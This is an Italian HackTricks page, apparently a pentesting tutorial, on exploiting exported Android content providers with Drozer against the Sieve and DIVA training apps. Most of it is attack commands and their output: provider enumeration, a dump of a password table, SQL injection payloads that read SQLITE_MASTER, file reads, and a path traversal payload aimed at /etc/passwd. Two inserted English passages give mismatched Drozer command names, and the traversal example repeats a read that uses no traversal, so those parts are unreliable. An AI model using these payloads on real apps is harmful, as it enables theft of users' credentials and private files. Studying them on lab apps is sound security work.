# Sfruttare i Content Provider

## Sfruttare i Content Provider

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Introduzione

I dati vengono **forniti da un'applicazione ad altre** su richiesta da un componente noto come **content provider**. Queste richieste vengono gestite attraverso i metodi della classe **ContentResolver**. I content provider possono memorizzare i loro dati in varie posizioni, come un **database**, **file** o su una **rete**.

Nel file _Manifest.xml_, √® richiesta la dichiarazione del content provider. Ad esempio:
```xml
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
<path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```
Per accedere a `content://com.mwr.example.sieve.DBContentProvider/Keys`, √® necessaria l'autorizzazione `READ_KEYS`. √à interessante notare che il percorso `/Keys/` √® accessibile nella sezione seguente, che non √® protetta a causa di un errore dello sviluppatore, che ha protetto `/Keys` ma ha dichiarato `/Keys/`.

**Forse √® possibile accedere a dati privati o sfruttare qualche vulnerabilit√† (SQL Injection o Path Traversal).**

## Ottenere informazioni dai **content provider esposti**
```
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
Authority: com.mwr.example.sieve.FileBackupProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.FileBackupProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
```
√à possibile ricostruire come raggiungere il **DBContentProvider** iniziando gli URI con "_content://_". Questo approccio si basa su informazioni ottenute utilizzando Drozer, dove le informazioni chiave sono state trovate nella directory _/Keys_.

Drozer pu√≤ **indovinare e provare diversi URI**:
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
Dovresti anche controllare il codice del **ContentProvider** per cercare le query:

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

Inoltre, se non riesci a trovare le query complete, potresti **controllare quali nomi sono dichiarati dal ContentProvider** nel metodo `onCreate`:

![](<../../../.gitbook/assets/image (186).png>)

La query sar√† del tipo: `content://nome.del.pacchetto.classe/nome_dichiarato`

## **Content Provider con database**

Probabilmente la maggior parte dei Content Provider viene utilizzata come **interfaccia** per un **database**. Pertanto, se riesci ad accedervi, potresti essere in grado di **estrarre, aggiornare, inserire ed eliminare** informazioni.\
Verifica se puoi **accedere a informazioni sensibili** o prova a modificarle per **eludere i meccanismi di autorizzazione**.

Quando controlli il codice del Content Provider, **cerca** anche le **funzioni** chiamate: _query, insert, update e delete_:

![](<../../../.gitbook/assets/image (187).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

Poich√© sarai in grado di chiamarle.

### Contenuto della query
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```
### Inserire contenuto

Interrogando il database, si apprender√† il **nome delle colonne**, quindi sar√† possibile inserire dati nel database:

![](<../../../.gitbook/assets/image (188) (1).png>)

![](<../../../.gitbook/assets/image (189) (1).png>)

_Nota che nell'inserimento e nell'aggiornamento √® possibile utilizzare --string per indicare una stringa, --double per indicare un numero decimale, --float, --integer, --long, --short, --boolean_

### Aggiornare contenuto

Conoscendo il nome delle colonne, √® anche possibile **modificare le voci**:

![](<../../../.gitbook/assets/image (190).png>)

### Eliminare contenuto

![](<../../../.gitbook/assets/image (191).png>)

### **SQL Injection**

√à semplice testare l'iniezione SQL **(SQLite)** manipolando i campi **proiezione** e **selezione** che vengono passati al content provider.\
Quando si interroga il Content Provider, ci sono 2 argomenti interessanti per cercare informazioni: _--selection_ e _--projection_:

![](<../../../.gitbook/assets/image (192) (1).png>)

√à possibile provare a **abusare** di questi **parametri** per testare le **iniezioni SQL**:
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```
**Scoperta automatica di SQLInjection tramite Drozer**

Drozer is an Android security assessment framework that allows you to perform various security tests on Android applications. One of the features of Drozer is the ability to automatically discover SQLInjection vulnerabilities in Android applications.

Drozer uses a technique called "content provider injection" to identify potential SQLInjection vulnerabilities. Content providers are components in Android applications that allow data to be shared between different applications. By injecting malicious SQL queries into content provider URIs, Drozer can determine if the application is vulnerable to SQLInjection attacks.

To use Drozer for automatic SQLInjection discovery, follow these steps:

1. Install Drozer on your computer and connect your Android device to it.
2. Start the Drozer console and run the command `run app.provider.finduri` to list all the content provider URIs in the target application.
3. Identify the content provider URI that you want to test for SQLInjection vulnerabilities.
4. Run the command `run app.provider.query content://<provider_uri> --projection <column_name> --selection <selection> --selectionArgs <selection_args>` to inject a malicious SQL query into the content provider URI. Replace `<provider_uri>` with the actual content provider URI, `<column_name>` with the name of the column you want to retrieve, `<selection>` with the selection condition, and `<selection_args>` with the selection arguments.
5. Analyze the response from the application. If the response contains any error messages or unexpected behavior, it indicates a potential SQLInjection vulnerability.

By using Drozer's automatic SQLInjection discovery feature, you can quickly identify and exploit SQLInjection vulnerabilities in Android applications, helping you improve the security of your mobile applications.
```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
android_metadata
notes
sqlite_sequence
```
## **Fornitori di contenuti basati sul sistema di file**

I fornitori di contenuti possono essere utilizzati anche per **accedere ai file:**

![](<../../../.gitbook/assets/image (193).png>)

### Leggere un **file**

√à possibile leggere i file dal Fornitore di Contenuti
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
### **Path Traversal**

Se puoi accedere ai file, puoi provare ad abusare di un Path Traversal (in questo caso non √® necessario, ma puoi provare a usare "_../_" e trucchi simili).
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
**Scoperta automatica del Path Traversal tramite Drozer**

Drozer is an Android security assessment framework that allows you to perform various security tests on Android applications. One of the techniques it supports is the automatic discovery of Path Traversal vulnerabilities in Android applications.

Drozer uses a technique called "fuzzing" to automatically test the application's Content Providers for Path Traversal vulnerabilities. Content Providers are components in Android applications that allow data to be shared between different applications. They can be accessed using a URI (Uniform Resource Identifier) scheme.

To perform automatic Path Traversal discovery using Drozer, you need to follow these steps:

1. Install Drozer on your testing machine and connect it to the target Android device.
2. Start the Drozer console and run the following command to list all the available Content Providers on the target device:

   ```
   run app.provider.find
   ```

   This command will display a list of all the Content Providers along with their URIs.

3. Once you have identified the Content Provider you want to test, run the following command to perform the automatic Path Traversal discovery:

   ```
   run app.provider.query content://<provider_uri>/../../../../../../../../etc/passwd
   ```

   Replace `<provider_uri>` with the URI of the Content Provider you want to test. The `../../../../../../../../etc/passwd` part is the Path Traversal payload that will be used to test for vulnerabilities.

4. If the Content Provider is vulnerable to Path Traversal, Drozer will display the contents of the `/etc/passwd` file. This indicates that an attacker can access sensitive files on the target device.

By using Drozer's automatic Path Traversal discovery feature, you can quickly identify and exploit Path Traversal vulnerabilities in Android applications. This can help you assess the security of an application and protect it from potential attacks.
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider
```
## Riferimenti

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)
* [https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf](https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
